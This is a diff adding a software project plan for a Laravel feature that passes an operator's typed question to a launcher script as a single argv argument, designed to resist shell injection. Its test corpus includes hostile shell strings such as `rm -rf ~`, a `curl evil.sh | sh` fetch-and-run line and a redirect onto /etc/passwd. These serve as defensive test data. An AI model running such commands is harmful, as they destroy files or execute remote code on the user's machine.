@@ -1,0 +1,680 @@
+code: US-009
+plan_body: |-
+  ## Technical Solution
+
+  US-009 is the third and last of this product's integration points, and the only one that **writes outward**. The other two read: an HTTPS GET of an `.ics` feed, a bounded read of a file the pipeline owns. This one executes a program on the operator's machine with a string the operator typed. That inversion is the whole design problem, and the spec names it outright: *"Question text containing quotes, newlines, backticks, semicolons, `$(...)`, or other shell metacharacters reaches the script as a single intact argument and cannot alter the command — this is the security-critical criterion of the spec."*
+
+  Everything below follows from three commitments: **there is no shell**, **there is exactly one place that builds the argument array**, and **every blocked path names the configuration key or the action that fixes it**.
+
+  ### 1. Where the code lives (John)
+
+  A new `app/Launcher/` domain folder, sibling to the existing `app/Calendar/`, `app/Transcripts/`, `app/Meetings/`, and `app/Doctor/`. Nothing new appears at the `app/` root beyond that one folder, and nothing in it knows about HTTP.
+
+  | Class | Responsibility |
+  | --- | --- |
+  | `App\Launcher\LaunchCommand` | Readonly value object: script, context path, question. `toArray(): list<string>` returns exactly three elements; `display(): string` renders the three quoted lines for the UI. **The only place the argument array is constructed.** |
+  | `App\Launcher\LaunchBlock` | Backed enum of every refusal reason, each with its own `message()`. Eight cases, never collapsed into one "error". |
+  | `App\Launcher\LauncherScript` | Resolves and validates `KBMS_CLAUDE_LAUNCHER` — unset / no file / not executable / OK. Extracted from the doctor check so the two surfaces cannot drift. |
+  | `App\Launcher\LaunchPreflight` | Occurrence + question → `LaunchCommand` or `LaunchBlock`. Called before dispatch **and** inside the job. |
+  | `App\Launcher\ClaudeSessionLauncher` | Runs a `LaunchCommand` through the `Process` facade with a bounded timeout; returns a `LaunchOutcome`. |
+  | `App\Launcher\LaunchOutcome` | Readonly result: status, exit code, captured stderr (bounded), duration. |
+  | `App\Launcher\PromptLaunchStatus` | Backed enum `queued` \| `launched` \| `failed` \| `timed_out` \| `blocked`. |
+  | `App\Models\PromptLaunch` | The persisted row. |
+  | `App\Jobs\LaunchClaudeSession` | Queued, `tries = 1`, takes the launch id. |
+  | `App\Livewire\AskClaude` | The meeting-detail panel. |
+
+  Service and job names are the ones the PRD `## Core Components` already commits to (`ClaudeSessionLauncher`, `LaunchClaudeSession`) — do not rename them.
+
+  ### 2. One place builds the argument array, and the type system enforces it (Lars + Alex)
+
+  `LaunchCommand::toArray()` returns `[$script, $contextPath, $question]` — exactly three elements, in that order, always. `ClaudeSessionLauncher::run(LaunchCommand $command): LaunchOutcome` takes the value object; there is **no overload that accepts a string**, so "someone interpolates a shell string one day" is prevented by the signature rather than by a code-review habit.
+
+  Laravel's `Process` facade passes an **array** command straight to Symfony's `Process` constructor, which hands an argv array to `proc_open`. No shell is spawned, nothing is parsed, nothing is escaped — because there is nothing to escape. A question containing `` `rm -rf ~` `` arrives at the script as `$2`, byte for byte, and the script sees one argument. **Never** call `Process::run()` with a string anywhere in `app/Launcher/`, never prepend `sh -c`, `bash -lc`, `nohup`, or `open`, and never build a command by concatenation.
+
+  `LaunchCommand::display()` is the opposite concern and must be labelled as such in its docblock: it renders the invocation for the operator to read and copy, as three lines — script, argument one, argument two — each wrapped in single quotes with embedded `'` escaped as `'\''`. That formatting **is** the argument-array statement made visible (mockup `meeting.html` L267-273). It is cosmetic output only and is never fed to a process. The panel and the job both derive from the same `LaunchCommand`, so what the operator copies is what the worker ran.
+
+  ### 3. Eight refusals, each with its own sentence (Tom + Lars)
+
+  `states.html` is explicit that these must not collapse, and the mockup README repeats it: *"Every error and blocked state names the configuration key or the action that fixes it."*
+
+  | `LaunchBlock` case | Condition | Message (assert this string) |
+  | --- | --- | --- |
+  | `LauncherNotConfigured` | `KBMS_CLAUDE_LAUNCHER` empty | ``KBMS_CLAUDE_LAUNCHER`` is not configured. |
+  | `LauncherMissing` | no file at the configured path | No launcher script at "{path}" — check `KBMS_CLAUDE_LAUNCHER`. |
+  | `LauncherNotExecutable` | file exists, not executable | Script found but not executable: `chmod +x {path}` |
+  | `NoTranscript` | no `meeting_transcripts` row, or the tombstone (`path` NULL) | No transcript linked — there would be no context file to pass as argument one. |
+  | `TranscriptRejected` | persisted path fails `TranscriptsDirectory::contains()` | The linked path escapes `KBMS_TRANSCRIPTS_PATH` and is refused outright. |
+  | `TranscriptUnreadable` | contained, but gone or unreadable now | The linked transcript is no longer readable at "{path}". |
+  | `QuestionEmpty` | empty or whitespace-only after trim | Type a question first — whitespace only is rejected before anything is dispatched. |
+  | `QuestionTooLong` | over `KBMS_QUESTION_MAX_CHARS`, or contains a null byte | Question is {n} characters; the bound is {max}. / A question cannot contain a null byte. |
+
+  The first three are **exactly** what `App\Doctor\Checks\LauncherScriptCheck` already computes today. Extract that logic into `App\Launcher\LauncherScript` and have the doctor check consume it, keeping its existing `CheckResult` wording. `kbms:doctor` and the launch panel then answer the same question with the same code, which is the point of FR-011 in the first place. `DoctorCommandTest` must stay green unchanged — if it needs editing, the extraction changed behavior and is wrong.
+
+  `NoTranscript` covers the tombstone deliberately: a `manual` row with `path = NULL` means the operator rejected the convention's match (US-007, decision `transcript clear link semantics`). There is no context file, so there is no launch.
+
+  ### 4. The job waits for the exit code — superseding the inception decision (John + Jack)
+
+  Recorded decision `terminal launch mode` originally read *"app fires it in background via `Process::start`"* (`2deaf85cb3b47934`). That is not implementable alongside two of this spec's acceptance criteria, and the user confirmed the supersession in this planning session (`d184baee682dd396`, 2026-09-10):
+
+  - Symfony `Process::__destruct()` calls `stop(0)` (`vendor/symfony/process/Process.php:226`). A process started and not waited on is **killed** when the job object is collected. The spec's own reasoning for using a queued job says exactly this.
+  - *"A non-zero exit from the launcher is recorded on the launch row and surfaced in the interface"* cannot be satisfied without waiting for an exit code.
+
+  So the job calls `Process::timeout($seconds)->run($command->toArray())` and waits. This costs milliseconds in the normal case: the operator's script exists to spawn its own terminal window (`osascript`, `open -a`, or equivalent) and return, and that window belongs to the terminal application, not to PHP. Quitting `queue:work` does not close it — which is the acceptance criterion about lifetime independence, satisfied by the script's design rather than by any detachment trick on our side.
+
+  `KBMS_LAUNCH_TIMEOUT_SECONDS` (default **30**) bounds the wait. A script that has not returned in 30 seconds is violating the documented two-argument contract — it is running Claude in the foreground instead of spawning a window — and the honest response is the one this product uses everywhere else: state it. `status = timed_out`, error text *"the launcher did not return within {n}s — it must exit once it has spawned its own terminal window"*, README updated to say so.
+
+  Job configuration:
+
+  - `public int $tries = 1;` — **not negotiable.** A retried job opens a second terminal window, and there is no key that could suppress the duplicate.
+  - `public int $timeout` = `KBMS_LAUNCH_TIMEOUT_SECONDS + 15`, so the worker's own timeout never fires before the process timeout and steals the error message.
+  - No `ShouldBeUnique`: two different meetings may legitimately launch at once. The double-click guard is §6's status transition.
+  - No TTY (`Process` allocates none by default) and no PTY. The spec forbids driving a terminal, and we do not.
+
+  ### 5. Preflight runs twice (Lars)
+
+  Once in the Livewire action, so a blocked launch produces a specific reason and **nothing is dispatched**; once at the top of `handle()`, because the script, the transcript file, and `KBMS_TRANSCRIPTS_PATH` are all mutable between dispatch and execution. A second-pass failure writes `status = blocked` and the reason onto the row and returns — it never throws, because a failed precondition is not an exception, it is an outcome the operator needs to read.
+
+  The context path is re-derived from the `meeting_transcripts` row and re-checked with `TranscriptsDirectory::contains()` on both passes. The stored path is an absolute string written when the base was what it was; the base is a `.env` value that can change under it. US-007 already made revalidate-on-every-read the rule here — this is the same rule applied to execution.
+
+  Nothing client-supplied reaches the command except the question text. The script comes from config, the context path comes from the database via the occurrence key, and the occurrence key is `#[Locked]` on the component.
+
+  ### 6. The row (Mike)
+
+  `prompt_launches` — the shape the PRD `## Core Components` already specifies, plus `exit_code`:
+
+  | Column | Type | Notes |
+  | --- | --- | --- |
+  | `id` | uuid pk | consistent with every other domain table |
+  | `event_uid` | string | occurrence natural key |
+  | `event_recurrence_id` | string, default `''` | |
+  | `context_path` | string | absolute, as executed |
+  | `question` | text | the operator's field — FR-012 reads this |
+  | `command` | json | the argument array, as executed — the forensic record |
+  | `status` | string | `PromptLaunchStatus` cast |
+  | `exit_code` | integer, nullable | `127` in the mockup's worked example |
+  | `error` | text, nullable | block reason, stderr excerpt, or timeout message |
+  | `launched_at` | timestamp, nullable | set when the process actually starts |
+  | timestamps | | `created_at` is the dispatch instant |
+
+  Index `['event_uid', 'event_recurrence_id', 'created_at']` — serves the "latest launch for this occurrence" lookup now and FR-012's history list later, by leftmost prefix. **No foreign key to `calendar_events`**, for the reason already recorded twice in this codebase (decision `meeting note storage keying`): the only targetable column is the UUID surrogate `id`, which is precisely the identity a resync may change, and a cascade would hand the feed a route to destroy operator data. **No Eloquent relation** either — the composite-key `hasOne(...)->where(...)` workaround cross-contaminates siblings under `with()`. Reads go through `scopeForOccurrence(OccurrenceKey)`, exactly like `MeetingNote` and `MeetingTranscript`.
+
+  Storing the question twice, in `question` and inside `command`, is deliberate: one is the operator's text, the other is what was actually executed. If they ever disagree, the bug is visible instead of silent.
+
+  **Lifecycle, and the double-dispatch guard.** The Livewire action writes the row with `status = queued` and dispatches the job with its id. The job loads the row, and **refuses to run unless it is still `queued`** — so a second job for the same row (double click, manual re-dispatch, a retry that somehow slipped through) finds `launched` and returns without opening a second window. The button is also disabled client-side while a launch is `queued`, but that is convenience; the status check is the guard.
+
+  Writing the row before dispatch also gives the panel something to show immediately — the mockup's `Dispatched` tag (`states.html` L347-349) — and gives the job a stable id rather than a serialized payload.
+
+  **FR-012 is next phase.** This spec writes the rows and surfaces the **latest** launch's outcome only. Do not build the history list, even though `meeting.html` draws it; the mockup says outright that it is designed now *"so the `prompt_launches` row shape does not have to change later"*.
+
+  ### 7. The panel (Elise + Joe)
+
+  `App\Livewire\AskClaude`, replacing the `US-009` placeholder currently sitting in `resources/views/pages/meeting.blade.php`. Class-based, per the `.ai/rules/livewire.md` rule — `php artisan make:livewire AskClaude --class`.
+
+  Built to `meeting.html` L243-273 and `states.html` L310-367:
+
+  - Question `<textarea class="kb-textarea kb-textarea--sm">` with the help line *"Handed to your script as the second argument, exactly as typed — quotes, newlines and `$(...)` included, never interpreted."*
+  - **The only `sk-btn--primary` on the page** — "▶ Launch session". Disabled with `aria-describedby` pointing at the block reason whenever preflight refuses.
+  - A `Launcher ready` / `Blocked` tag in `.kb-panel__actions`.
+  - The exact invocation in `<pre class="kb-command">`, three lines, `.kb-arg` and `.kb-arg--2` on the two arguments; a "Copy invocation" button reusing the existing pattern from `transcript-panel.blade.php` L108-114 (`onclick="navigator.clipboard.writeText(@js($display))"`), and the caption *"Two arguments, in order: context file, then question."*
+  - Empty question: `aria-invalid="true"` on the textarea and `role="alert"` on the message, validated **before** anything is dispatched.
+  - Latest outcome: `Dispatched` tag while queued; a `kb-banner role="alert"` carrying *"Launcher exited {code}"* plus *"Copy the invocation below and run it in a terminal to see the script's own output"* on failure.
+
+  `.kb-command`, `.kb-command .kb-arg`, and `.kb-command .kb-arg--2` are the only classes this spec needs that `resources/css/app.css` does not already have — port them verbatim from `.larapilot/mockups/kbms-app/kbms.css` L324-331. `kb-textarea`, `kb-banner`, `kb-tag--muted`, `kb-inline`, `kb-stack`, `kb-path` are already there.
+
+  **Polling.** While the latest launch is `queued`, `wire:poll.1s` on the panel; the poll stops the moment the status is terminal, so an idle meeting page issues no requests. If the row is still `queued` after `2 × KBMS_LAUNCH_TIMEOUT_SECONDS`, the panel adds *"still queued — is `php artisan queue:work` running?"*. The doctor check already warns that *"a reachable queue is not the same as a running worker"*; this is that warning delivered at the moment it matters.
+
+  Desktop-first per the PRD's recorded inversion; the obligation is only that nothing breaks below 768px, which for this panel means the `<pre>` scrolls horizontally rather than wrapping the arguments. AA contrast in both themes for `.kb-arg` / `.kb-arg--2`, which reuse `--kb-transcript` and `--kb-note`.
+
+  ### 8. The question bound (Tom + Alex)
+
+  `KBMS_QUESTION_MAX_CHARS`, default **8000**. macOS `ARG_MAX` is 1 MiB shared across argv and the environment, so 8000 characters is two orders of magnitude clear of the kernel limit — the bound is a product decision, not a system one. That is exactly what makes the acceptance criterion *"a very long question is accepted or explicitly bounded — it must not fail opaquely against argument-length limits"* true by construction: the failure mode is a stated character count, never an `E2BIG` from `proc_open`.
+
+  Enforced in the Livewire validation rules with a live counter near the textarea, and again in `LaunchPreflight` so a component-bypassing path cannot skip it. A null byte in the question is rejected on the same pass — `proc_open` cannot carry one in argv, and refusing it is clearer than truncating.
+
+  ### 9. Configuration and documentation
+
+  Two new keys, following the `config/kbms.php` array-shape PHPDoc convention and documented in all three places the existing surface is documented (`config/kbms.php`, `.env.example`, `ConfigurationSurfaceTest`, plus the README table):
+
+  | Key | Default | Consumed by |
+  | --- | --- | --- |
+  | `KBMS_LAUNCH_TIMEOUT_SECONDS` | `30` | US-009 — seconds the job waits for the launcher to return |
+  | `KBMS_QUESTION_MAX_CHARS` | `8000` | US-009 — maximum question length |
+
+  The PRD `## Configuration surface` and `## PRD Revision History` gain a row for both, plus the `exit_code` column on `prompt_launches`. The README's existing **"The launcher script contract"** section grows three sentences: the script must return once it has spawned its window, its exit code is recorded and shown, and `php artisan queue:work` must be running for a launch to happen at all.
+
+  ### 10. Explicitly not built
+
+  Named here so review does not go looking for them: **no reply capture** (PRD non-goal, FR-018 — the meeting record holds the question, not the answer); **no prompt history list** (FR-012, next phase); **no prompt templates** (FR-015); **no TTY allocation and no terminal-application driving**; **no validation, linting, or editing of the operator's script** beyond exists-and-executable — the script is a configured dependency this product invokes and never touches.
+
+  ## Git & Branching
+
+  - Mode: **`GITFLOW`** (`settings.git_mode`) — branch and commit locally, **never push**, prepare the internal PR description only.
+  - Branch: `feature/US-009-claude-launch-bridge`, from `develop` at `d9ff877` (the US-008 merge). The tree is clean and US-007 is merged, so this is a clean branch point with nothing to stack on.
+  - TASK-00 bootstraps the branch and drafts the PR body toward `develop`.
+  - One atomic Conventional Commit per task: `type(US-009): TASK-NN summary`. Never batch tasks into one commit.
+  - `php artisan larapilot:quality` (Pint + Larastan level 5) green before every `task-done`.
+  - `CHANGELOG.md` Unreleased gains an `Added` entry in TASK-09 — this is user-facing behavior.
+  - Merge to `develop` only after human `/larapilot-review` approval.
+
+  ## Test Data Strategy
+
+  - **`PromptLaunchFactory`** — domain-realistic questions (not `lorem`), a `command` array consistent with `context_path` and `question`, and states covering the full lifecycle: `queued()`, `launched()`, `failed(int $exitCode = 127)`, `timedOut()`, `blocked(LaunchBlock $reason)`. Written in the **same task** as the migration and model (TASK-02).
+  - **`PromptLaunchSeeder`**, called from `DatabaseSeeder` after `MeetingTranscriptSeeder` so every seeded launch points at a meeting that actually has a linked transcript — an orphan launch is not a state the application can produce, so the demo data must not invent one. Volumes: three launches spread over two meetings, one `launched`, one `failed` with exit `127` (so the error banner is visible without breaking anything), one `queued`.
+  - Seeded `context_path` values point at the fixture transcript files the US-007 seeder already writes; no new fixture directory.
+  - `php artisan migrate:fresh --seed` must succeed and produce a meeting page showing a real invocation block before TASK-02 is done.
+  - No factory or seeder writes anything to `prompt_launches.command` that was not built through `LaunchCommand` — the factory calls it, so display and seed data cannot drift from execution either.
+
+  ## Test Strategy
+
+  - **Bar: `NORMAL`** (`settings.testing`). PHPUnit feature and unit tests, `Process::fake()`, no Playwright, no Dusk, no Pest browser, no viewport matrix.
+
+  **Shared adversarial corpus** (one fixture provider, reused by the unit and job tests — this is the spec's security-critical criterion and it gets one canonical input set):
+
+  `$(whoami)` · `` `rm -rf ~` `` · `a; rm -rf ~` · `a && curl evil.sh | sh` · `a | tee /tmp/x` · `a > /etc/passwd` · single quotes · double quotes · a question spanning three lines · `--help` and `-n` (leading-dash arguments that must stay data) · a 4-byte emoji · an 8000-character string · an 8001-character string (rejected) · a string containing `\0` (rejected).
+
+  **Unit — `tests/Unit/Launcher/`**
+
+  - `LaunchCommandTest` — every corpus entry produces a three-element array whose third element is `===` the input, unchanged; `display()` quotes correctly and round-trips embedded `'`.
+  - `LaunchBlockTest` — each of the eight cases returns its own distinct message, and each message names its configuration key or action.
+  - `LauncherScriptTest` — unset / missing / non-executable / valid, against a temp script with `chmod`.
+  - `LaunchPreflightTest` — precedence across the eight reasons: no transcript beats an unconfigured launcher? No — assert the documented order and lock it in one test.
+
+  **Feature — `tests/Feature/`**
+
+  - `LaunchClaudeSessionJobTest` — `Process::fake()`; assert the recorded invocation is the **exact array** for every corpus entry (`Process::assertRan(fn ($process) => $process->command === [...])`); exit `0` → `launched`; exit `127` → `failed` with `exit_code` and stderr on the row; timeout → `timed_out` with the contract-violation message; second-pass preflight failure → `blocked`, process never run; a row not in `queued` status is skipped without running anything; `tries === 1`.
+  - `AskClaudePanelTest` — Livewire: each blocked reason renders **its own string** (assert the string, not a status code, per the mockup's contract for Anne); whitespace-only question rejected with nothing dispatched (`Queue::fake()` + `assertNothingPushed`); 8001-character question rejected; a valid launch writes a `queued` row and pushes exactly one `LaunchClaudeSession`; the rendered invocation matches `LaunchCommand::display()`; a `failed` latest launch surfaces "Launcher exited 127".
+  - `PromptLaunchDurabilityTest` — a resync that retitles, reschedules, and cancels the occurrence leaves its launches addressable by natural key (the same shape as `MeetingNoteDurabilityTest` / `TranscriptDurabilityTest`).
+  - `ConfigurationSurfaceTest` — extended with both new keys in the documented-defaults assertions and the `.env.example` key list.
+  - `DoctorCommandTest` — must pass **unchanged** after the `LauncherScript` extraction. Any edit needed there means the refactor changed behavior.
+  - `MeetingDetailTest` — the US-009 placeholder string is gone and the panel renders.
+
+  **Manual test handoff** (attached at review, since `NORMAL` plans no browser automation): with a real `chmod +x` script that runs `osascript` to open a Terminal window — launch, confirm the window opens with both arguments intact; quit `queue:work` and confirm the window survives; `chmod -x` the script and confirm the specific blocked message; point `KBMS_CLAUDE_LAUNCHER` at a script that `sleep 60`s and confirm the timeout message rather than a hung worker; paste a question containing `$(whoami)` and confirm the terminal shows it literally.
+tasks:
+  -
+    id: TASK-00
+    title: 'Bootstrap feature branch from develop'
+    body: |-
+      ## Description
+      Bootstrap Gitflow for US-009: branch `feature/US-009-claude-launch-bridge` from `develop` and prepare the internal PR description locally. `develop` is at `d9ff877` (the US-008 merge) with a clean tree and US-007 already merged, so this is a clean branch point with nothing to stack on. Do **not** push — `settings.git_mode` is `GITFLOW`.
+
+      ## Files Involved
+      - (git only — no application files)
+
+      ## Steps
+      1. `git checkout develop`
+      2. `git checkout -b feature/US-009-claude-launch-bridge`
+      3. Draft the internal PR title/body toward `develop` — title `US-009: Claude Code session launch bridge`; body links this plan and lists the planned tasks
+      4. `git commit --allow-empty -m "chore(US-009): TASK-00 bootstrap feature branch"`
+
+      ## Completion Criteria
+      - [x] Branch `feature/US-009-claude-launch-bridge` exists locally, off `d9ff877`
+      - [x] PR title/body drafted for `develop`, kept local
+      - [x] Nothing pushed
+
+      ## Test Data
+      - N/A — no model or schema change in this task
+
+      ## Git Deliverables
+      - Commit: `chore(US-009): TASK-00 bootstrap feature branch` (empty commit)
+      - Push: **skip** (`git_mode: GITFLOW`)
+      - PR: prepared locally only
+    type: Impl
+    status: DONE
+    assignee: Sarah
+    estimate_hours: 0.5
+    dependencies: {}
+    commit:
+      sha: 801b3c2c0e39e2e677782ecbe27e293a2ce65c37
+      short_sha: 801b3c2
+      subject: 'chore(US-009): TASK-00 bootstrap feature branch'
+      committed_at: '2026-09-10T08:26:50+02:00'
+      url: 'https://github.com/giarfa/personal-kbms/commit/801b3c2c0e39e2e677782ecbe27e293a2ce65c37'
+  -
+    id: TASK-01
+    title: 'Extend the configuration surface with the launch timeout and question bound'
+    body: |-
+      ## Description
+      Add the two `.env` keys the launch bridge needs and keep every place that documents the configuration surface in step. See plan `## Technical Solution` §9.
+
+      Runs in parallel with TASK-02 — no shared files.
+
+      ## Files Involved
+      - config/kbms.php
+      - .env.example
+      - tests/Feature/ConfigurationSurfaceTest.php
+
+      ## Steps
+      1. `config/kbms.php`: add `'launch_timeout_seconds' => (int) env('KBMS_LAUNCH_TIMEOUT_SECONDS', 30)` and `'question_max_chars' => (int) env('KBMS_QUESTION_MAX_CHARS', 8000)`
+      2. Extend the file's array-shape PHPDoc with both entries, matching the existing style
+      3. `.env.example`: add both keys under the Personal KBMS block with a comment each. The timeout comment must state **why** it exists — the launcher is expected to return once it has spawned its own terminal window, and the timeout is what turns a script that blocks instead into a stated error rather than a hung worker
+      4. `ConfigurationSurfaceTest`: add both keys to the documented-defaults assertions **and** to the `.env.example` key list
+      5. `php artisan test --filter=ConfigurationSurfaceTest`
+      6. `php artisan larapilot:quality`
+
+      ## Completion Criteria
+      - [x] Both keys resolve to their documented defaults with nothing set in `.env`
+      - [x] `.env.example` documents both, with the timeout's rationale stated
+      - [x] `config/kbms.php` PHPDoc array shape covers both
+      - [x] `ConfigurationSurfaceTest` passes and asserts both
+      - [x] Pint + Larastan green
+
+      ## Test Data
+      - N/A — no model or schema change in this task
+
+      ## Git Deliverables
+      - Commit: `feat(US-009): TASK-01 add launch timeout and question bound to the configuration surface`
+      - Push: **skip** (`git_mode: GITFLOW`)
+      - PR: update the local PR notes only
+    type: Impl
+    status: DONE
+    assignee: Alex
+    estimate_hours: 1
+    dependencies:
+      - TASK-00
+    commit:
+      sha: a953585fc88f4e53556dd598e512ec8682aa1afd
+      short_sha: a953585
+      subject: 'feat(US-009): TASK-01 add launch timeout and question bound to the configuration surface'
+      committed_at: '2026-09-10T08:29:19+02:00'
+      url: 'https://github.com/giarfa/personal-kbms/commit/a953585fc88f4e53556dd598e512ec8682aa1afd'
+  -
+    id: TASK-02
+    title: 'Add the prompt_launches table, model, factory and seeder'
+    body: |-
+      ## Description
+      The persisted launch record — PRD `## Core Components` shape plus `exit_code`. See plan `## Technical Solution` §6.
+
+      Runs in parallel with TASK-01 — no shared files.
+
+      ## Files Involved
+      - database/migrations/xxxx_create_prompt_launches_table.php
+      - app/Models/PromptLaunch.php
+      - app/Launcher/PromptLaunchStatus.php
+      - database/factories/PromptLaunchFactory.php
+      - database/seeders/PromptLaunchSeeder.php
+      - database/seeders/DatabaseSeeder.php
+      - tests/Unit/Models/PromptLaunchTest.php
+
+      ## Steps
+      1. `php artisan make:migration create_prompt_launches_table --no-interaction`. Columns: `uuid('id')->primary()`, `string('event_uid')`, `string('event_recurrence_id')->default('')`, `string('context_path')`, `text('question')`, `json('command')`, `string('status')`, `integer('exit_code')->nullable()`, `text('error')->nullable()`, `timestamp('launched_at')->nullable()`, `timestamps()`, `index(['event_uid', 'event_recurrence_id', 'created_at'])`
+      2. Docblock the migration with the **no-foreign-key** reasoning, copying the shape used in `create_meeting_transcripts_table` — the only targetable column is the UUID surrogate `id`, exactly the identity a resync may change, and a cascade would give the feed a route to destroy operator data
+      3. `App\Launcher\PromptLaunchStatus`: backed enum `Queued` \| `Launched` \| `Failed` \| `TimedOut` \| `Blocked`, TitleCase keys, lower_snake values
+      4. `php artisan make:model PromptLaunch --no-interaction`. `HasUuids`, `$guarded = []`, casts `status` to the enum, `command` to `array`, `launched_at`/timestamps to datetime. Property-level PHPDoc. `scopeForOccurrence(Builder, OccurrenceKey)` and `scopeLatestFirst()` — copy the `MeetingTranscript` shape, including the docblock stating that no Eloquent relation to `CalendarEvent` is defined and why
+      5. `PromptLaunchFactory`: domain-realistic questions (not `lorem`); `command` built by calling `LaunchCommand` is **not** available yet, so build the array literally here and add the TASK-03 follow-up note in the factory docblock — TASK-03 replaces it with a `LaunchCommand::toArray()` call. States: `queued()`, `launched()`, `failed(int $exitCode = 127)`, `timedOut()`, `blocked()`
+      6. `PromptLaunchSeeder`: three launches across two seeded meetings that already have linked transcripts, `context_path` pointing at the US-007 seeder's fixture files — one `launched`, one `failed` with exit `127`, one `queued`. Register it in `DatabaseSeeder` **after** `MeetingTranscriptSeeder`
+      7. `php artisan migrate:fresh --seed`
+      8. `php artisan test --filter=PromptLaunchTest` and `php artisan larapilot:quality`
+
+      ## Completion Criteria
+      - [x] Migration creates the table with the composite index and no foreign key, reasoning docblocked
+      - [x] `PromptLaunch` casts `status` and `command`, exposes `forOccurrence()`, defines no Eloquent relation
+      - [x] `PromptLaunchFactory` produces valid rows in all five states with realistic questions
+      - [x] `PromptLaunchSeeder` creates launches only against meetings that have a linked transcript — no orphan launches
+      - [x] `migrate:fresh --seed` succeeds
+      - [x] Pint + Larastan green
+
+      ## Test Data
+      - [x] `database/factories/PromptLaunchFactory.php` created, with the five lifecycle states
+      - [x] `database/seeders/PromptLaunchSeeder.php` created and registered in `DatabaseSeeder` after `MeetingTranscriptSeeder`
+      - [x] Factory and seeder land in **this same task** as the migration and model
+
+      ## Git Deliverables
+      - Commit: `feat(US-009): TASK-02 add prompt_launches with factory and seeder`
+      - Push: **skip** (`git_mode: GITFLOW`)
+      - PR: update the local PR notes only
+    type: Impl
+    status: DONE
+    assignee: Mike
+    estimate_hours: 3
+    dependencies:
+      - TASK-00
+    commit:
+      sha: 7c4ac91c16a160b58550f28c33ead56ff027d34b
+      short_sha: 7c4ac91
+      subject: 'feat(US-009): TASK-02 add prompt_launches with factory and seeder'
+      committed_at: '2026-09-10T08:29:25+02:00'
+      url: 'https://github.com/giarfa/personal-kbms/commit/7c4ac91c16a160b58550f28c33ead56ff027d34b'
+  -
+    id: TASK-03
+    title: 'Build the launcher domain: command, blocks, script resolution and preflight'
+    body: |-
+      ## Description
+      The security core of the spec. One value object owns the argument array; eight named refusals; the doctor's launcher checks are extracted so `kbms:doctor` and the panel share one implementation. See plan `## Technical Solution` §2, §3, §5, §8.
+
+      ## Files Involved
+      - app/Launcher/LaunchCommand.php
+      - app/Launcher/LaunchBlock.php
+      - app/Launcher/LauncherScript.php
+      - app/Launcher/LaunchPreflight.php
+      - app/Doctor/Checks/LauncherScriptCheck.php (refactor to consume `LauncherScript`)
+      - database/factories/PromptLaunchFactory.php (switch `command` to `LaunchCommand::toArray()`)
+
+      ## Steps
+      1. `App\Launcher\LaunchCommand`: `final readonly` with promoted `string $script, string $contextPath, string $question`. `toArray(): list<string>` returns exactly `[$script, $contextPath, $question]`. `display(): string` renders the three quoted lines — single-quote wrapping with `'` escaped as `'\''`. Docblock `display()` as **presentation only, never passed to a process**, and `toArray()` as the single construction site of the argument array
+      2. `App\Launcher\LaunchBlock`: backed enum with the eight cases and a `message(): string` per plan §3's table. Cases needing interpolation (`LauncherMissing`, `LauncherNotExecutable`, `TranscriptUnreadable`, `QuestionTooLong`) take their detail through a `message(?string $detail = null)` parameter rather than becoming stringly-typed
+      3. `App\Launcher\LauncherScript`: `resolve(): string|LaunchBlock` — unset → `LauncherNotConfigured`, `! is_file()` → `LauncherMissing`, `! is_executable()` → `LauncherNotExecutable`, else the path
+      4. Refactor `LauncherScriptCheck` to call `LauncherScript::resolve()` and map its three block cases onto the **existing** `CheckResult` wording. `DoctorCommandTest` must pass unchanged — if it needs editing, the refactor changed behavior and is wrong
+      5. `App\Launcher\LaunchPreflight`: `for(CalendarEvent $occurrence, string $question): LaunchCommand|LaunchBlock`. Order: launcher script → transcript row (missing row or tombstone → `NoTranscript`) → `TranscriptsDirectory::contains()` → readable → question trimmed non-empty → no null byte → within `kbms.question_max_chars`. Lock that order in a test in TASK-04
+      6. Update `PromptLaunchFactory` to build `command` via `LaunchCommand::toArray()`, removing the TASK-02 placeholder note
+      7. `php artisan test --filter=DoctorCommandTest` and `php artisan larapilot:quality`
+
+      ## Completion Criteria
+      - [x] `ClaudeSessionLauncher` does not exist yet, but no class in `app/Launcher/` builds a command string anywhere — no `sh -c`, no `nohup`, no concatenation
+      - [x] `LaunchCommand::toArray()` is the only place the argument array is constructed; `display()` is docblocked as presentation-only
+      - [x] All eight `LaunchBlock` cases return distinct messages naming a configuration key or an action
+      - [x] `LauncherScriptCheck` consumes `LauncherScript` and `DoctorCommandTest` passes **unedited**
+      - [x] `LaunchPreflight` returns a `LaunchCommand` or a `LaunchBlock`, never throws, never returns null
+      - [x] Pint + Larastan green
+
+      ## Test Data
+      - [x] `PromptLaunchFactory` updated to build `command` through `LaunchCommand::toArray()`
+
+      ## Git Deliverables
+      - Commit: `feat(US-009): TASK-03 add the launcher command, block reasons and preflight`
+      - Push: **skip** (`git_mode: GITFLOW`)
+      - PR: update the local PR notes only
+    type: Impl
+    status: DONE
+    assignee: Alex
+    estimate_hours: 4
+    dependencies:
+      - TASK-01
+      - TASK-02
+    commit:
+      sha: dfa176eeaa34b4e3f701c9a08dcf8895827dc1c9
+      short_sha: dfa176e
+      subject: 'feat(US-009): TASK-03 add the launcher command, block reasons and preflight'
+      committed_at: '2026-09-10T08:32:46+02:00'
+      url: 'https://github.com/giarfa/personal-kbms/commit/dfa176eeaa34b4e3f701c9a08dcf8895827dc1c9'
+  -
+    id: TASK-04
+    title: 'Unit-test the argument array against the adversarial corpus and every block reason'
+    body: |-
+      ## Description
+      The spec's security-critical criterion, tested at the unit level before any process is involved. See plan `## Test Strategy` for the shared corpus — it lives in one provider and is reused by TASK-06.
+
+      ## Files Involved
+      - tests/Unit/Launcher/AdversarialQuestions.php (shared data provider trait or static provider)
+      - tests/Unit/Launcher/LaunchCommandTest.php
+      - tests/Unit/Launcher/LaunchBlockTest.php
+      - tests/Unit/Launcher/LauncherScriptTest.php
+      - tests/Unit/Launcher/LaunchPreflightTest.php
+
+      ## Steps
+      1. Write the shared corpus once: `$(whoami)`, backticks, `a; rm -rf ~`, `a && curl evil.sh | sh`, `a | tee /tmp/x`, `a > /etc/passwd`, single quotes, double quotes, a three-line question, `--help`, `-n`, a 4-byte emoji, an 8000-character string
+      2. `LaunchCommandTest`: for every corpus entry assert `toArray()` has exactly three elements and `toArray()[2] === $question` byte for byte; assert `display()` produces three lines and round-trips embedded single quotes
+      3. `LaunchBlockTest`: assert all eight cases return distinct, non-empty messages, and that each names its configuration key or its action (`KBMS_CLAUDE_LAUNCHER`, `chmod +x`, `KBMS_TRANSCRIPTS_PATH`, the character bound)
